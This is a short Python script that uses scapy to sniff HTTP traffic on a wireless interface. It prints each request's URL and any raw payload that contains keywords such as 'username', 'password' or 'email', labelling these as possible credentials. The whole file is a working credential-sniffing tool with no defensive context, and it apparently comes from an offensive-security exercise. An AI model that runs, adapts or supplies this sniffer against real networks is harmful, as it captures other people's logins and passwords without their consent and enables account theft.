import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=pro_sniff_packet)
def get_url(packet):
    return packet[http.HTTPRequest].Path + packet[http.HTTPRequest].Host

def get_login_info(packet):
    #print(packet.show())
    if packet.haslayer(scapy.Raw):
        load = str(packet[scapy.Raw].load)
        keys = ["username", "password", "login", "usr", "Pass", "name", "Name", "pass", "Username", "Password", "email", "Email"]
        for i in keys:
            if i in load:
                return load

def pro_sniff_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >> " + str(url) + "\n")
        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+]Possible username/Password >> " + str(login_info) + "\n\n")

sniff("wlan0")
